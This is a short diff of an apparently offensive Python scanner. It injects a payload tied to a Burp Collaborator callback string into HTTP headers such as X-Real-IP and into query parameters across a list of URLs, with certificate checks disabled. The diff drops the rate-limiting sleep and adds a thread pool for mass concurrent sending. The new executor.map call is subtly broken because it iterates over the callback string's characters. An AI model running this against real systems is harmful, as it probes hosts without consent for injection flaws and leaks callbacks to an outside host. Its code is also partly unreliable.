@@ -1,5 +1,4 @@
 import requests
-from time import sleep
 import concurrent.futures
 
 
@@ -28,15 +27,13 @@ def send_payload(url, burp_colab_string):
         "X-Real-IP": payload,
     }
     stripped_url = url.strip()
-    # print(f"[{counter}] Trying {stripped_url}")
     print(stripped_url)
     requests.get(url, headers=headers, params=params, verify=False, timeout=10)
 
 
 def payload_sender(urls, burp_colab_string):
-    for url in urls:
-        try:
-            send_payload(url, burp_colab_string)
-        except:
-            print("SOMETHING WENT WRONG (proper error handling not implemented yet).")
-        sleep(0.5)
+    try:
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            executor.map(send_payload, urls, burp_colab_string)
+    except:
+        print("SOMETHING WENT WRONG (proper error handling not implemented yet).")
